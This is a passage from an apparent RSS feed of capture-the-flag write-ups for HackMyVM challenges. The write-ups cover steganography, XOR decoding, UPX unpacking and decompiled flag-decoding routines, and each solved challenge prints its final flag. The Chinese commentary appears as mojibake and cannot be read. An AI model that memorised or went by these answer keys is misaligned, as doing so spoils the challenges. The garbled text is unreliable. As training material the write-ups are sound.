b4,rgb,msb,xy       .. text: 'E4sEFVaS6'
b4,bgr,lsb,xy       .. text: 'ESCxtTgz'
b4,bgr,msb,xy       .. text: '0DuCFQVc3'
```

Ê≤°Âï•ÊÑüÂÖ¥Ë∂£ÁöÑÔºåÂ∫îËØ•ÊòØlsb

https://georgeom.net/StegOnline/extract

Extract Data  RGBÂÖ®0

hexÈÇ£ÊâíÊãâ‰∏ÄÊÆµ

```
68091924000000000108000000111b5342e6eeab5bb7855cd926dc2491c75648d2564
```

Â§ÑÁêÜ

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ cat 074.txt | perl -lpe '$_=pack'B*',$_' | xxd -p
00646f5f796f755f6c696b655f786f723f0a
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ echo -n '00646f5f796f755f6c696b655f786f723f0a' | wc -c        
36
                    
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ echo '68091924000000000108000000111b5342e6eeab5bb7855cd926dc2491c75648d2564' | head -c 36
68091924000000000108000000111b5342e6                                                    
```

XOR‰∏Ä‰∏ã
```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ python3 -c 'a='00646f5f796f755f6c696b655f786f723f0a';b='68091924000000000108000000111b5342e6';print(''.join(format(int(a[i:i+2],16)^int(b[i:i+2],16),'02x')for i in range(0,36,2)))'
686d767b796f755f6d616b655f6974217dec
                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ echo '686d767b796f755f6d616b655f6974217dec' | xxd -r -p
hmv{you_make_it!}ÔøΩ                                                                      
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20074.html</guid><pubDate>Wed, 06 Aug 2025 00:32:22 +0000</pubDate></item><item><title>Challenge 073</title><link>https://7r1UMPHK.github.io/post/Challenge%20073.html</link><description>![image-20250722220049943](https://7r1umphk.github.io/image/20250722220050174.webp)

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ 7z x 073.zip 

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 1764017 bytes (1723 KiB)

Extracting archive: 073.zip
--
Path = 073.zip
Type = zip
Physical Size = 1764017

Everything is Ok

Size:       1764017
Compressed: 1764017
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ ls -al
ÊÄªËÆ° 3466
drwxr-xr-x 1 kali kali    4096  7Êúà22Êó• 10:02 .
drwxr-xr-x 1 kali kali   16384  7Êúà22Êó• 00:08 ..
-rwxr-xr-x 1 kali kali 1764017 2024Âπ¥ 5Êúà26Êó• 073.png
-rwxr-xr-x 1 kali kali 1764017  7Êúà22Êó• 10:01 073.zip
```

![073](https://7r1umphk.github.io/image/20250722220234455.webp)

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ stegseek 073.png               
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[!] error: the file format of the file '073.png' is not supported.
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ binwalk 073.png 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 1600 x 1600, 8-bit/color RGB, non-interlaced
60            0x3C            Zlib compressed data, default compression

                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ steghide extract -sf 073.png   
Enter passphrase: 
steghide: the file format of the file '073.png' is not supported.
                                                                
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ zsteg 073.png  
imagedata           .. text: 'UYZ.31)+)'
b1,rgb,lsb,xy       .. text: 'nI?nKdK`$'
b4,r,lsb,xy         .. text: '\'D3ffUDUDDUUfUw'
b4,g,lsb,xy         .. text: 'D3UUUDD33DDUUww'
b4,b,lsb,xy         .. text: 'fffffUUUffUUDD333333333DDDDDDDD33333333DD33D3UD3DD3\'\''
b4,b,msb,xy         .. text: ['\'' repeated 8 times]
b4,rgb,lsb,xy       .. text: '0e&amp;Re&amp;RU'
b4,bgr,lsb,xy       .. text: '03%bV%bV'

‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ zsteg -E 'b4,rgb,lsb,xy' 073.png &gt; a
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ file a
a: data
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ ls -la a
-rwxr-xr-x 1 kali kali 3840000  7Êúà22Êó• 10:06 a

‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ binwalk a

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
```

https://georgeom.net/StegOnline/extract

Extract Files/Data

![image-20250722221534561](https://7r1umphk.github.io/image/20250722221534835.webp)

```
hmv{youreallyknowLSBbro}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20073.html</guid><pubDate>Tue, 22 Jul 2025 15:10:50 +0000</pubDate></item><item><title>Challenge 072</title><link>https://7r1UMPHK.github.io/post/Challenge%20072.html</link><description>![image-20250722215411456](https://7r1umphk.github.io/image/20250722215411704.webp)

Ëß£ÂéãÔºåÊü•Áúã

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ ls -al 
ÊÄªËÆ° 91364
drwxr-xr-x 1 kali kali     4096  7Êúà22Êó• 09:57 .
drwxr-xr-x 1 kali kali    16384  7Êúà22Êó• 00:08 ..
-rwxr-xr-x 1 kali kali 93536118 2024Âπ¥ 4Êúà 7Êó• 072.zip
drwxr-xr-x 1 kali kali        0  7Êúà22Êó• 09:57 fr1end
                         
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ cd fr1end         
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/‚Ä¶/gx/x/tmp/fr1end]
‚îî‚îÄ$ grep -r 'HMV{' .                                                                                           
./fr1end-main/server/keys/flag.txt:HMV{jWt_m4keS_th3_w0rLd_g0_r0und}
          
```

Áßísentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20072.html</guid><pubDate>Tue, 22 Jul 2025 15:10:38 +0000</pubDate></item><item><title>Challenge 071</title><link>https://7r1UMPHK.github.io/post/Challenge%20071.html</link><description>![image-20250722214605319](https://7r1umphk.github.io/image/20250722214605558.webp)

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ 7z x 071.zip 

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 3437 bytes (4 KiB)

Extracting archive: 071.zip
--
Path = 071.zip
Type = zip
Physical Size = 3437

Everything is Ok

Size:       7094
Compressed: 3437
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ ls -al 
ÊÄªËÆ° 31
drwxr-xr-x 1 kali kali  4096  7Êúà22Êó• 09:46 .
drwxr-xr-x 1 kali kali 16384  7Êúà22Êó• 00:08 ..
-rwxr-xr-x 1 kali kali  3437  7Êúà22Êó• 09:46 071.zip
-rwxr-xr-x 1 kali kali  7094 2024Âπ¥ 2Êúà15Êó• hmv-moje02.txt
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ cat hmv-moje02.txt 
JalanClmd Ad X fVyVazIXtAxVf AazVIaXzAlaXt XyzAiAdz Xaf oXyUzAiAdz ylttVyzAiV Xaf CliVCVaz TIACXIAtn Ualva glI Azd iXIAlmd ynEVIXzzXyUd XOXAadz dViVIXt OliVIaCVazd, OliVIaCVaz AadzAzmzAlad Xaf OliVIaCVaz XOVayAVd, ylITlIXzAlad Xaf zoV somIyo lg YyAVazltlOn. JalanClmd lIAOAaXzVf Aa 2003 la zoV ACXOVElXIf 4yoXa IVTIVdVazAaO zoV ylayVTz lg CXan latAaV Xaf lggtAaV ylCCmaAzn mdVId dACmtzXaVlmdtn VKAdzAaO Xd Xa 'XaXIyoAy', fAOAzAxVf 'OtlEXt EIXAa' lI 'oAiVCAaf'. JalanClmd CVCEVId (Ualva Xd Xalad) yXa dlCVzACVd EV fAdzAaOmAdoVf Aa TmEtAy En zoV vVXIAaO lg Qmn uXvUVd CXdUd Aa zoV dzntV TlIzIXnVf Aa zoV OIXToAy aliVt Xaf gAtC w glI wVafVzzX. YlCV Xalad Xtdl lTz zl CXdU zoVAI ilAyVd zoIlmOo ilAyV yoXaOVId lI zVKz-zl-dTVVyo TIlOIXCd. BlxVad lg TVlTtV oXiV EVVa XIIVdzVf glI AailtiVCVaz Aa JalanClmd ynEVIXzzXyUd Aa ylmazIAVd AaytmfAaO zoV eaAzVf YzXzVd, zoV eaAzVf NAaOflC, JmdzIXtAX, zoV kVzoVItXafd, Ylmzo JgIAyX, YTXAa, qafAX, Xaf bmIUVn. PiXtmXzAlad lg zoV OIlmT'd XyzAlad Xaf VggVyzAiVaVdd iXIn vAfVtn. YmTTlIzVId oXiV yXttVf zoV OIlmT 'gIVVflC gAOozVId' Xaf fAOAzXt RlEAa Wllfd, voAtV yIAzAyd oXiV fVdyIAEVf zoVC Xd 'X ynEVI tnayo-ClE' lI 'ynEVI zVIIlIAdzd'. qa 2012, bACV yXttVf JalanClmd laV lg zoV '100 Cldz AagtmVazAXt TVlTtV' Aa zoV vlItf. JalanClmd' CVfAX TIlgAtV fACAaAdoVf En 2018, Emz zoV OIlmT IV-VCVIOVf Aa 2020 zl dmTTlIz zoV QVlIOV utlnf TIlzVdzd Xaf lzoVI yXmdVd. MoAtldlTon boV ToAtldlTon lg JalanClmd lggVId AadAOoz Aazl X tlaO-dzXafAaO TltAzAyXt pmVdzAla zoXz oXd OlaV maXadvVIVf vAzo lgzVa zIXOAy yladVpmVayVd glI dlyAXt CliVCVazd: voXz flVd X aVv glIC lg ylttVyzAiV TltAzAyd tllU tAUV zoXz vAdoVd zl Ol EVnlaf zoV AfVazAzn lg zoV AafAiAfmXt dmESVyz Aa tXzV yXTAzXtAdC? qazVIaXt fAddVaz Ad Xtdl X IVOmtXI gVXzmIV lg zoV OIlmT. J vVEdAzV XddlyAXzVf vAzo zoV OIlmT fVdyIAEVd Az Xd 'Xa qazVIaVz OXzoVIAaO' vAzo 'X iVIn tlldV Xaf fVyVazIXtAxVf ylCCXaf dzImyzmIV zoXz lTVIXzVd la AfVXd IXzoVI zoXa fAIVyzAiVd'. QXEIAVttX sltVCXa vIAzVd lg zoV OIlmT: 'qa dlCV vXnd, Az CXn EV ACTlddAEtV zl OXmOV zoV AazVaz Xaf ClzAiV lg zolmdXafd lg TXIzAyATXazd, CXan lg vol fla'z ViVa ElzoVI zl tVXiV X zIXyV lg zoVAI zolmOozd, ClzAiXzAlad, Xaf IVXyzAlad. JClaO zoldV zoXz fl, lTAaAlad iXIn yladAfVIXEtn.' FIlXftn dTVXUAaO, Jalad lTTldV qazVIaVz yVadlIdoAT Xaf ylazIlt Xaf zoV CXSlIAzn lg zoVAI XyzAlad zXIOVz OliVIaCVazd, lIOXaAxXzAlad, Xaf ylITlIXzAlad zoXz zoVn XyymdV lg yVadlIdoAT. Jalad vVIV VXItn dmTTlIzVId lg zoV OtlEXt GyymTn CliVCVaz Xaf zoV JIXE YTIAaO. YAayV 2008, X gIVpmVaz dmESVyz lg fAdXOIVVCVaz vAzoAa JalanClmd Ad voVzoVI CVCEVId dolmtf glymd la TIXaUAaO Xaf VazVIzXAaCVaz lI ClIV dVIAlmd (Xaf, Aa dlCV yXdVd, TltAzAyXt) XyzAiAdC. ZV [JalanClmd] Smdz oXTTVa zl EV X OIlmT lg TVlTtV la zoV qazVIaVz vol aVVf‚ÄîSmdz UAaf lg Xa lmztVz zl fl Xd vV vAdo, zoXz vV vlmtfa'z EV XEtV zl fl Aa IVOmtXI dlyAVzn. ...boXz'd ClIV lI tVdd zoV TlAaz lg Az. Bl Xd nlm vAdo. ... boVIV'd X ylCCla ToIXdV: 'vV XIV flAaO Az glI zoV tmtx.' ‚Äî‚ÄäbIVaz MVXylyU, 'YVXIyo PaOAaV: boV uXyV lg JalanClmd, uVEImXIn 7, 2008. FVyXmdV JalanClmd oXd al tVXfVIdoAT, al XyzAla yXa EV XzzIAEmzVf zl zoV CVCEVIdoAT Xd X voltV. MXICn Gtdla Xaf lzoVId oXiV yIAzAyAxVf CVfAX yliVIXOV zoXz TIVdVazd zoV OIlmT Xd vVtt-lIOXaAxVf lI olClOVaVlmd; Gtdla vIAzVd, 'boVIV vXd al dAaOtV tVXfVI TmttAaO zoV tViVId, Emz X gVv lIOXaAxXzAlaXt CAafd zoXz dlCVzACVd TlltVf zlOVzoVI zl dzXIz TtXaaAaO X dzmaz.' YlCV CVCEVId TIlzVdz mdAaO tVOXt CVXad, voAtV lzoVId VCTtln AttVOXt CVXdmIVd dmyo Xd BBlY XzzXyUd Xaf oXyUAaO. cVCEVIdoAT Ad lTVa zl XanlaV vol vAdoVd zl dzXzV zoVn XIV X CVCEVI lg zoV ylttVyzAiV; FIAzAdo SlmIaXtAdz sXIltV sXfvXttXfI lg boV GEdVIiVI ylCTXIVf zoV OIlmT'd fVyVazIXtAxVf dzImyzmIV zl zoXz lg Xt-hXVfX: 'qg nlm EVtAViV Aa JalanClmd, Xaf yXtt nlmIdVtg JalanClmd, nlm XIV JalanClmd.' Gtdla, vol glICVItn fVdyIAEVf JalanClmd Xd X 'EIXaf', dzXzVf Aa 2012 zoXz doV alv yoXIXyzVIAxVf Az Xd X 'CliVCVaz' IXzoVI zoXa X OIlmT: 'XanlaV yXa EV TXIz lg Az. qz Ad X yIlvf lg TVlTtV, X aVEmtlmd yIlvf lg TVlTtV, vlIUAaO zlOVzoVI Xaf flAaO zoAaOd zlOVzoVI glI iXIAlmd TmITldVd.' boV OIlmT'd gVv ImtVd AaytmfV alz fAdytldAaO laV'd AfVazAzn, alz zXtUAaO XElmz zoV OIlmT, Xaf alz XzzXyUAaO CVfAX. cVCEVId ylCClatn mdV zoV zXOtAaV 'ZV XIV JalanClmd. ZV XIV LVOAla. ZV fl alz glIOAiV. ZV fl alz glIOVz. PKTVyz md.' FIAXa NVttn vIAzVd zoXz zoIVV lg zoV OIlmT'd UVn yoXIXyzVIAdzAyd XIV ' Xa maIVtVazAaO ClIXt dzXayV la AddmVd Xaf IAOozd, IVOXIftVdd lg fAIVyz TIlilyXzAla; X TondAyXt TIVdVayV zoXz XyylCTXaAVd latAaV oXyUAaO XyzAiAzn; Xaf  X fAdzAayzAiV EIXaf.' jlmIaXtAdzd oXiV ylCCVazVf zoXz JalanClmd' dVyIVyn, gXEIAyXzAlad, Xaf CVfAX XvXIVaVdd TldV Xa mamdmXt yoXttVaOV glI IVTlIzAaO la zoV OIlmT'd XyzAlad Xaf ClzAiXzAlad. hmAaa klIzla lg ZAIVf vIAzVd zoXz: 'Jalad tAV voVa zoVn oXiV al IVXdla zl tAV. boVn vVXiV iXdz gXEIAyXzAlad Xd X glIC lg TVIglICXayV. boVa zoVn zVtt zoV zImzo Xz maVKTVyzVf Xaf maglIzmaXzV zACVd, dlCVzACVd fVdzIlnAaO zoVCdVtiVd Aa zoV TIlyVdd. boVn XIV maTIVfAyzXEtV.'. Fn zoV vXn Wcw{Ad_zoV_EVdz_vVEdAzV_glI_imtaVIXEtV_iAIzmXt_CXyoAaVd}. klIzla dzXzVd zoXz zoV fAggAymtzAVd Aa IVTlIzAaO la zoV OIlmT yXmdV Cldz vIAzVId, AaytmfAaO oVIdVtg, zl glymd la zoV 'dCXtt OIlmTd lg oXyUVId vol dzltV zoV tACVtAOoz gIlC X tVOAla, fVgAVf zoVAI iXtmVd, Xaf yIXdoVf iAltVaztn Aazl zoV tXv' IXzoVI zoXa 'JalanClmd'd dVX lg ilAyVd, Xtt VKTVIACVazAaO vAzo aVv vXnd lg EVAaO Aa zoV vlItf'. YAayV 2009, flxVad lg TVlTtV oXiV EVVa XIIVdzVf glI AailtiVCVaz Aa JalanClmd ynEVIXzzXyUd, Aa ylmazIAVd AaytmfAaO zoV e.Y., eN, JmdzIXtAX, zoV kVzoVItXafd, YTXAa, Xaf bmIUVn. Jalad OVaVIXttn TIlzVdz zoVdV TIldVymzAlad Xaf fVdyIAEV zoVdV AafAiAfmXtd Xd CXIznId zl zoV CliVCVaz. boV jmtn 2011 XIIVdz lg LmtxYVy CVCEVI blTAXIn EVyXCV X TXIzAymtXI IXttnAaO TlAaz, tVXfAaO zl X vAfVdTIVXf 'uIVV blTAXIn' CliVCVaz. boV gAIdz TVIdla zl EV dVaz zl SXAt glI TXIzAyATXzAla Aa Xa JalanClmd BBlY XzzXyU vXd BCAzIAn QmxaVI, Xa JCVIAyXa 19-nVXI-ltf. WV TtVXfVf OmAtzn zl 'maXmzolIAxVf ACTXAICVaz lg X TIlzVyzVf ylCTmzVI' Aa kliVCEVI 2009 Xaf vXd dVazVayVf zl 366 fXnd Aa e.Y. gVfVIXt TIAdla. Ga jmaV 13, 2011, lggAyAXtd Aa bmIUVn XIIVdzVf 32 AafAiAfmXtd zoXz vVIV XttVOVftn AailtiVf Aa BBlY XzzXyUd la bmIUAdo OliVIaCVaz vVEdAzVd. boVdV CVCEVId lg JalanClmd vVIV yXTzmIVf Aa fAggVIVaz yAzAVd lg bmIUVn AaytmfAaO qdzXaEmt Xaf JaUXIX. JyylIfAaO zl Ms cXOXxAaV, zoVdV AafAiAfmXtd vVIV XIIVdzVf XgzVI zoVn XzzXyUVf vVEdAzVd Xd X IVdTladV zl zoV bmIUAdo OliVIaCVaz fVCXaf zl qYMd zl ACTtVCVaz X dndzVC lg gAtzVId zoXz CXan oXiV TVIyVAiVf Xd yVadlIdoAT. soIAd Blnla (XtAXd 'slCCXafVI r'), X dVtg-fVdyIAEVf tVXfVI lg JalanClmd, vXd XIIVdzVf Aa YVTzVCEVI 2011 glI X ynEVIXzzXyU la zoV vVEdAzV lg YXazX sImx slmazn, sXtAglIaAX. WV SmCTVf EXAt Aa uVEImXIn 2012 Xaf gtVf XyIldd zoV ElIfVI Aazl sXaXfX. qa YVTzVCEVI 2012, SlmIaXtAdz Xaf JalanClmd XddlyAXzV FXIIVzz FIlva, Ualva glI dTVXUAaO zl CVfAX la EVoXtg lg zoV OIlmT, vXd XIIVdzVf olmId XgzVI TldzAaO X iAfVl zoXz XTTVXIVf zl zoIVXzVa uFq XOVazd vAzo TondAyXt iAltVayV. FIlva vXd dmEdVpmVaztn yoXIOVf vAzo 17 lggVadVd, AaytmfAaO TmEtAdoAaO TVIdlaXt yIVfAz yXIf AaglICXzAla gIlC zoV YzIXzglI oXyU.   
```

ÊàëÂè™ËÉΩËØ¥aiÁßí‰∫Ü

![image-20250722215322625](https://7r1umphk.github.io/image/20250722215322722.webp)

```
HMV{is_the_best_website_for_vulnerable_virtual_machines}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20071.html</guid><pubDate>Tue, 22 Jul 2025 15:10:27 +0000</pubDate></item><item><title>Challenge 070</title><link>https://7r1UMPHK.github.io/post/Challenge%20070.html</link><description>![image-20250722212408911](https://7r1umphk.github.io/image/20250722212409115.webp)

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ 7z x 070.zip 

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 308448 bytes (302 KiB)

Extracting archive: 070.zip
--
Path = 070.zip
Type = zip
Physical Size = 308448

Everything is Ok

Files: 2
Size:       316108
Compressed: 308448
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ ls -al
ÊÄªËÆ° 631
drwxr-xr-x 1 kali kali   4096  7Êúà22Êó• 09:39 .
drwxr-xr-x 1 kali kali  16384  7Êúà22Êó• 00:08 ..
-rwxr-xr-x 1 kali kali 308448  7Êúà22Êó• 09:39 070.zip
-rwxr-xr-x 1 kali kali   6600 2024Âπ¥ 3Êúà14Êó• hmv005
-rwxr-xr-x 1 kali kali 309508 2024Âπ¥ 3Êúà14Êó• hmv005-static
                                     
```

Â∞ùËØïÂèçÁºñËØë‰∏Ä‰∏ã

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ strings hmv005                            
UPX!
tdoP7
[oQ7
/lib64
nux-x86-
so.2
puts
free
strlen
mall
art_
cxa_f    iz.
6sLIBC_2.34
5/ITM_deZgiE
CWneTabeK`
]_*(
PTE1
u+UH
_GLOBAL_OFFSET_TABLE_
frame_
dummy
 Lost in OSINT 
$/PP
;*3$'?}
USQRH
W^YH
PROT_EXEC|PROT_WRITE failed.
_j&lt;X
$Info: This file is packed with the UPX executable packer http://upx.sf.net $
$Id: UPX 4.22 Copyright (C) 1996-2024 the UPX Team. All Rights Reserved. $
_RPWQM)
j'AZR^j
PZS^
/proc/self/exe
IuDSWH
s2V^
XAVAWPH
YT_j
AY^_
D$ [I
UPX!u
slIT$}
}aw993u
([]A\A]
I[8k
(L      '
tL      n
+xHf
p(E1[$1
fFj9
~*'|]
I5(Ag
@bQs
 k1(
=(I[u
A^A_)
m@S r6
ck5?
JAPC
JG=,1
SRVW
RY?WVj,4
GCC: (Debian 13.2.0-
/|G`
 x!va
0G]/
aw7L
Scrt1.o
_tag
stuff.c
deregi
_clones)do_g
bal     tor
s9ux5omple)d.0!
_fin`array_entry
vme ummy2
)t*hmv005
'Fwyk
RAME_END
DYNIC
vGNU
GLOBA
L_OFFSET_TABL
see@
BC_2
59libc_
nrmay
ITM_
T)Xroo
se1chH
dF_uod
cj(3bssNc
~KeySav
imP_
oize5
6.symnb
h        Np
o.gnu.prop
build-id
K       dynb
la(so#
.ehthd
Qd5G3
=,?8
'epa
.P/^
 0o9l
UPX!
UPX!
```

ËæìÂá∫‰∏≠Â§öÊ¨°Âá∫Áé∞‰∫Ü UPX! ‰ª•Âèä $Info: This file is packed with the UPX executable packer http://upx.sf.net $ ÁöÑÂ≠óÊ†∑„ÄÇËøôÊòéÁ°ÆË°®Á§∫ hmv005 Êñá‰ª∂‰ΩøÁî®‰∫Ü UPX Âä†Â£≥Â∑•ÂÖ∑ËøõË°å‰∫ÜÂéãÁº©ÂíåÊ∑∑Ê∑Ü„ÄÇ

ËÑ±Â£≥

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ upx -d hmv005
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2024
UPX 4.2.4       Markus Oberhumer, Laszlo Molnar &amp; John Reiser    May 9th 2024

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
     24851 &lt;-      6600   26.56%   linux/amd64   hmv005

Unpacked 1 file.
                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ ls -al
ÊÄªËÆ° 640
drwxr-xr-x 1 kali kali   4096  7Êúà22Êó• 09:41 .
drwxr-xr-x 1 kali kali  16384  7Êúà22Êó• 00:08 ..
-rwxr-xr-x 1 kali kali 308448  7Êúà22Êó• 09:39 070.zip
-rwxr-xr-x 1 kali kali  16192 2024Âπ¥ 3Êúà14Êó• hmv005
-rwxr-xr-x 1 kali kali 309508 2024Âπ¥ 3Êúà14Êó• hmv005-static
```

ÂèçÁºñËØë‰∏Ä‰∏ã

ÊãñÂÖ•IDA PRO

F5

```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned __int64 v3; // rbx
  size_t v4; // rax
  unsigned __int64 v5; // rbx
  size_t v6; // rax
  int v8[34]; // [rsp+0h] [rbp-C0h]
  int v9; // [rsp+88h] [rbp-38h]
  int v10; // [rsp+8Ch] [rbp-34h]
  void *ptr; // [rsp+90h] [rbp-30h]
  char *v12; // [rsp+98h] [rbp-28h]
  char *s; // [rsp+A0h] [rbp-20h]
  int v14; // [rsp+A8h] [rbp-18h]
  int i; // [rsp+ACh] [rbp-14h]

  v8[0] = 113;
  v8[1] = 120;
  v8[2] = 123;
  v8[3] = 89;
  v8[4] = 116;
  v8[5] = 118;
  v8[6] = 73;
  v8[7] = 78;
  v8[8] = 22;
  v8[9] = 92;
  v8[10] = 122;
  v8[11] = 77;
  v8[12] = 82;
  v8[13] = 106;
  v8[14] = 101;
  v8[15] = 84;
  v8[16] = 65;
  v8[17] = 74;
  v8[18] = 86;
  v8[19] = 94;
  v8[20] = 87;
  v8[21] = 121;
  v8[22] = 110;
  v8[23] = 109;
  v8[24] = 103;
  v8[25] = 97;
  v8[26] = 112;
  v8[27] = 76;
  v8[28] = 89;
  v8[29] = 79;
  v8[30] = 95;
  v8[31] = 86;
  v14 = 32;
  s = '_GLOBAL_OFFSET_TABLE_';
  v12 = 'frame_dummy';
  dontSearchForKeySaveTime(argc, argv, envp);
  ptr = malloc(0x21uLL);
  for ( i = 0; i &lt; v14; ++i )
  {
    v3 = i;
    v4 = strlen(s);
    v10 = s[v3 % v4];
    v5 = i;
    v6 = strlen(v12);
    v9 = v12[v5 % v6];
    *((_BYTE *)ptr + i) = v9 ^ v10 ^ LOBYTE(v8[i]);
  }
  *((_BYTE *)ptr + v14) = 0;
  searchHere();
  free(ptr);
  puts(::s);
  return 0;
}
```

Áºñ‰∏™py

```
# C ‰ª£Á†Å‰∏≠Êèê‰æõÁöÑÊï∞ÊçÆ
v8 = [
    113, 120, 123, 89, 116, 118, 73, 78, 22, 92, 122, 77, 82, 106, 101, 84,
    65, 74, 86, 94, 87, 121, 110, 109, 103, 97, 112, 76, 89, 79, 95, 86
]
s = '_GLOBAL_OFFSET_TABLE_'
v12 = 'frame_dummy'
v14 = 32 # flag ÈïøÂ∫¶

flag = []

# Â§çÁé∞ for Âæ™ÁéØÁöÑÈÄªËæë
for i in range(v14):
    # ËÆ°ÁÆó‰∏§‰∏™ÂØÜÈí•ÁöÑÂΩìÂâçÂ≠óÁ¨¶
    key_char1 = ord(s[i % len(s)])
    key_char2 = ord(v12[i % len(v12)])
    
    # Ëé∑Âèñ v8 Êï∞ÁªÑ‰∏≠ÁöÑÂÄº
    v8_char = v8[i]
    
    # ÊâßË°å‰∏âÊ¨°ÂºÇÊàñÊìç‰Ωú
    decrypted_char = key_char1 ^ key_char2 ^ v8_char
    
    # Â∞ÜËß£ÂØÜÂêéÁöÑÂ≠óÁ¨¶Ê∑ªÂä†Âà∞ÂàóË°®‰∏≠
    flag.append(chr(decrypted_char))

# Â∞ÜÂ≠óÁ¨¶ÂàóË°®ÂêàÂπ∂ÊàêÊúÄÁªàÁöÑÂ≠óÁ¨¶‰∏≤
final_flag = ''.join(flag)

print(f'Ëß£ÂØÜÂæóÂà∞ÁöÑ Flag ÊòØ: {final_flag}')
```

ËøêË°å

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ python3 a.py             
Ëß£ÂØÜÂæóÂà∞ÁöÑ Flag ÊòØ: HMV{Shad4wExe_We_love_OSINT_but}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20070.html</guid><pubDate>Tue, 22 Jul 2025 15:10:17 +0000</pubDate></item><item><title>Challenge 069</title><link>https://7r1UMPHK.github.io/post/Challenge%20069.html</link><description>![image-20250722210655654](https://7r1umphk.github.io/image/20250722210710989.webp)

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ 7z x 069.zip 

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 198 bytes (1 KiB)

Extracting archive: 069.zip
--
Path = 069.zip
Type = zip
Physical Size = 198

Everything is Ok

Size:       4
Compressed: 198
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ ls -al
ÊÄªËÆ° 21
drwxr-xr-x 1 kali kali  4096  7Êúà22Êó• 09:07 .
drwxr-xr-x 1 kali kali 16384  7Êúà22Êó• 00:08 ..
-rwxr-xr-x 1 kali kali     4 2024Âπ¥ 4Êúà19Êó• 069.bin
-rwxr-xr-x 1 kali kali   198  7Êúà22Êó• 09:07 069.zip
